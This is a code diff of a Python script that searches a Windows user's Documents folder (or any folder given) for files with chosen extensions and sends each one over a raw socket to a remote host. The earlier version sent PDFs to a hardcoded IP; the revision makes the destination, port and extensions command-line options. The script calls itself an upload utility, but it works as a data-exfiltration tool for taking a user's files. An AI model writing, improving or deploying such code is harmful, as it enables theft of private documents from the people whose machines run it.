@@ -3,24 +3,29 @@ import tqdm
 import os
 import argparse
 import time
+
+# Constants
 BUFFER_SIZE = 512 * 4
 
-import os
-username = os.environ['USERNAME']
-all_files = []
+# Functions
+def findFiles(extensions, username, folderPath):
+    matchingFiles = []
 
-def findPdfs():
-    for dirpath, dirnames, filenames in os.walk(f"C:\\Users\\{username}\\Documents\\"):
-        for filename in [f for f in filenames if f.endswith(".pdf")]:
-            all_files.append(os.path.join(dirpath, filename))
-    
-    return all_files
+    for dirpath, dirnames, filenames in os.walk(folderPath):
+        for filename in filenames:
+            _, extension = os.path.splitext(filename)
+            extension = extension.lstrip('.')
+            if extension in extensions:
+                matchingFiles.append(os.path.join(dirpath, filename))
 
-def sendFile(files, host, port):
+    return matchingFiles
+
+def sendFiles(files, host, port):
 
     for file in files:
         s = socket.socket()
         s.connect((host,port))
+
         filesize = int(os.path.getsize(file))
         progress = tqdm.tqdm(range(filesize), f"Sending {file}", unit="B", unit_scale=True, unit_divisor=1024)
 
@@ -69,9 +74,39 @@ def send_file(files, host, port):
     # close the socket
     s.close()
 
-if __name__ == "__main__":
-    files = findPdfs()
-    host = "1.1.1.1"
-    port = 60034
+def parseArguments():
+    parser = argparse.ArgumentParser(description="A simple upload utility.")
+
+    parser.add_argument('--dst', required=True, help='IPv4 address of the server')
+    parser.add_argument('--port', required=True, type=int, help='Listening port of the server')
+    parser.add_argument('--ext', required=True, help='File extensions to find [CSV]')
+    parser.add_argument('--username', help='Local user to fetch the files from')
+    parser.add_argument('--folder', help='Folder or local drive to start finding files from')
+
+    args = parser.parse_args()
+
+    return args
+
+def main():
+    # Argument Sanitization
+    args = parseArguments()
+    extensions = args.ext.split(',')
+    
+    if args.username == None:
+        username = os.environ['USERNAME']
+    else:
+        username = args.username
+
+    if args.folder == None:
+        folder = f'C:\\Users\\{username}\\Documents\\'
+    else:
+        folder = args.folder
+
+    print(args, extensions, username, folder)
+
+    files = findFiles(extensions, username, folder)
     if len(files) > 0:
-        sendFile(files, host, port)
+        sendFiles(files, args.dst, args.port)
+
+if __name__ == "__main__":
+    main()
